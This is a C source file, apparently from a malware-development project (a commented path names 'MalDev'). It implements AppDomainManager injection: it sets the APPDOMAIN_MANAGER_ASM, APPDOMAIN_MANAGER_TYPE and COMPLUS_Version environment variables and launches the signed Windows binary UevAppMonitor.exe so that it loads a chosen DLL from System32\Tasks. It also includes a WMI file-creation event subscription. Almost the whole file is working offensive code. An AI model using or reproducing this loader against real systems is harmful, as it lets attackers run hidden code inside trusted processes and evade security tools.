#include "pch.h"

VOID Callback
(
	_In_ BSTR lpInput,
	_In_ LPVOID Arg
)
{
	PrintFormatW(L"%s\n", lpInput);
}

BOOL InjectAppDomain
(
	_In_ LPWSTR lpFilePath,
	_In_ LPWSTR lpAssembly,
	_In_ LPWSTR lpClassName
)
{
	LPWSTR lpEnvStrs = NULL;
	LPWSTR lpTemp = NULL;
	LPSTR lpKey = NULL;
	LPSTR lpValue = NULL;
	DWORD cchEnvStrs = 0;
	LPWSTR lpEnvironment = NULL;
	LPWSTR lpAssemblyName = NULL;
	WCHAR wszTemp[0x200];
	BOOL Result = FALSE;
	WCHAR wszSystemPath[MAX_PATH];
	STARTUPINFOW StartupInfo;
	PROCESS_INFORMATION ProcInfo;
	LPWSTR lpClonedAssembly = NULL;

	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
	lpEnvStrs = GetEnvironmentStringsW();
	lpTemp = lpEnvStrs;
	while (TRUE) {
		if (lpTemp[0] == L'\0') {
			break;
		}

		cchEnvStrs += lstrlenW(lpTemp) + 1;
		lpTemp += lstrlenW(lpTemp) + 1;
	}

	lpEnvironment = ALLOC(cchEnvStrs * sizeof(WCHAR));
	memcpy(lpEnvironment, lpEnvStrs, cchEnvStrs * sizeof(WCHAR));
	lpClonedAssembly = DuplicateStrW(lpAssembly, 0);
	lpAssemblyName = PathFindFileNameW(lpClonedAssembly);
	lpTemp = StrStrW(lpAssemblyName, L".dll");
	if (lpTemp == NULL) {
		lpTemp = StrStrW(lpAssemblyName, L".DLL");
	}

	if (lpTemp == NULL) {
		goto CLEANUP;
	}

	lpTemp[0] = L'\0';
	wsprintfW(wszTemp, L"APPDOMAIN_MANAGER_ASM=%s, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null", lpAssemblyName);
	lpEnvironment = REALLOC(lpEnvironment, (cchEnvStrs + lstrlenW(wszTemp) + 1) * sizeof(WCHAR));
	memcpy(&lpEnvironment[cchEnvStrs], wszTemp, lstrlenW(wszTemp) * sizeof(WCHAR));
	cchEnvStrs += lstrlenW(wszTemp) + 1;
	wsprintfW(wszTemp, L"APPDOMAIN_MANAGER_TYPE=%s", lpClassName);
	lpEnvironment = REALLOC(lpEnvironment, (cchEnvStrs + lstrlenW(wszTemp) + 1) * sizeof(WCHAR));
	memcpy(&lpEnvironment[cchEnvStrs], wszTemp, lstrlenW(wszTemp) * sizeof(WCHAR));
	cchEnvStrs += lstrlenW(wszTemp) + 1;
	lpEnvironment = REALLOC(lpEnvironment, (cchEnvStrs + lstrlenW(L"COMPLUS_Version=v4.0.30319") + 2) * sizeof(WCHAR));
	memcpy(&lpEnvironment[cchEnvStrs], L"COMPLUS_Version=v4.0.30319", lstrlenW(L"COMPLUS_Version=v4.0.30319") * sizeof(WCHAR));
	GetSystemDirectoryW(wszSystemPath, _countof(wszSystemPath));
	StartupInfo.cb = sizeof(StartupInfo);
	if (!CreateProcessW(lpFilePath, NULL, NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, wszSystemPath, &StartupInfo, &ProcInfo)) {
		//LOG_ERROR("CreateProcessW", GetLastError());
		goto CLEANUP;
	}

	CloseHandle(ProcInfo.hThread);
	CloseHandle(ProcInfo.hProcess);
	Result = TRUE;
CLEANUP:
	FREE(lpClonedAssembly);
	FREE(lpEnvironment);

	return Result;
}

VOID NewThread
(
	_In_ LPWSTR lpEmptyFile
)
{
	Sleep(600000);
	if (!CreateEmptyFileW(lpEmptyFile)) {
		return;
	}
}

void test2(void) {
	InjectAppDomain(L"C:\\Windows\\System32\\UevAppMonitor.exe", L"C:\\Windows\\System32\\Tasks\\Tasks.dll", L"UevApp");
	//InjectAppDomain(L"D:\\Documents\\source\\repos\\MalDev\\AppDomainInjection\\bin\\Debug\\Sleep.exe", L"D:\\Documents\\source\\repos\\MalDev\\AppDomainInjection\\bin\\Debug\\Tasks.dll", L"MyAppDomainManager");
}

int test1(void) {
	LPWSTR lpTempPath = NULL;
	LPWSTR lpTempStr = NULL;
	LPWSTR lpQuery = NULL;
	LPWSTR lpEmptyFile = NULL;
	DWORD dwThreadID = 0;

	lpTempPath = GenerateTempPathW(NULL, NULL, NULL);
	if (!CreateDirectoryW(lpTempPath, NULL)) {
		goto CLEANUP;
	}

	lpTempStr = StrReplaceW(lpTempPath, L"\\", L"\\\\\\\\", TRUE, 0);
	lpQuery = DuplicateStrW(L"SELECT * from __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'CIM_DirectoryContainsFile' AND TargetInstance.GroupComponent='Win32_Directory.Name=\"", 0);
	lpQuery = StrCatExW(lpQuery, lpTempStr);
	lpQuery = StrCatExW(lpQuery, L"\"'");
	lpEmptyFile = StrAppendW(lpTempPath, L"\\a.txt");
	if (!CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NewThread, (LPVOID)lpEmptyFile, 0, &dwThreadID)) {
		goto CLEANUP;
	}

	Sleep(2000);
	RegisterAsyncEvent(lpQuery, Callback, NULL);
CLEANUP:
	FREE(lpEmptyFile);
	FREE(lpTempStr);
	FREE(lpQuery);
	FREE(lpTempPath);

	return 0;
}

int main(void) {
	test2();

	return 0;
}